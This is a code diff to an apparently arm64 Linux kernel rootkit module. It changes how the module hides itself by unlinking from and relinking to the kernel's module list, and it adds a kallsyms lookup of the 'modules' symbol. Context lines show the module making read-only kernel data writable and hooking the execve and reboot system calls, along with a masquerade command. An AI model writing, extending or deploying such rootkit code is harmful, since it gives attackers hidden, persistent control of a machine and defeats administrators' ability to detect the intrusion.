@@ -22,8 +22,10 @@ MODULE_VERSION("0.1");
 
 static int major;
 struct cdev *kernel_cdev;
-struct list_head *module_list;
 
+long is_hide;
+
+struct list_head *modules_;
 int (*access_remote_vm_)(struct mm_struct *, unsigned long,
 		void *, int, unsigned int);
 void (*update_mapping_prot_)(phys_addr_t, unsigned long, phys_addr_t, pgprot_t);
@@ -118,17 +120,15 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
             update_mapping_prot_(__pa_symbol(__start_rodata_), __start_rodata_, __end_rodata_ - __start_rodata_, PAGE_KERNEL);
             sys_call_table_[__NR_execve] = hook_execve;
             sys_call_table_[__NR_reboot] = hook_reboot;
-            //do something
             break;
         case IOCTL_MOD_HIDE:
-            if (module_list == NULL) {
-                // TODO SHOULD GO TO HEAD?
-                module_list = THIS_MODULE->list.prev;
-                list_del(&(THIS_MODULE->list));
+            if (is_hide) {
+                list_add_rcu(&(THIS_MODULE->list), modules_);
+                is_hide = 0;
             }
             else {
-                list_add(&(THIS_MODULE->list), module_list);
-                module_list = NULL;
+                list_del_rcu(&(THIS_MODULE->list));
+                is_hide = 1;
             }
             break;
         case IOCTL_MOD_MASQ:
@@ -181,6 +181,7 @@ static void ksym_lookup(void) {
     kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
     unregister_kprobe(&kp);
 
+    modules_             = (void *)kallsyms_lookup_name("modules");
     access_remote_vm_    = (void *)kallsyms_lookup_name("access_remote_vm");
     update_mapping_prot_ = (void *)kallsyms_lookup_name("update_mapping_prot");
     sys_call_table_      = (void *)kallsyms_lookup_name("sys_call_table");
@@ -189,6 +190,7 @@ static void ksym_lookup(void) {
     __start_rodata_ = (void *)kallsyms_lookup_name("__start_rodata");
     __end_rodata_   = (void *)kallsyms_lookup_name("__end_rodata");
     
+    printk (KERN_INFO "%px\n", modules_);
     printk (KERN_INFO "%px\n", sys_call_table_);
     printk (KERN_INFO "%px %px\n", sys_call_table_[__NR_execve], __arm64_sys_execve_);
     printk (KERN_INFO "%px %px\n", sys_call_table_[__NR_reboot], __arm64_sys_reboot_);
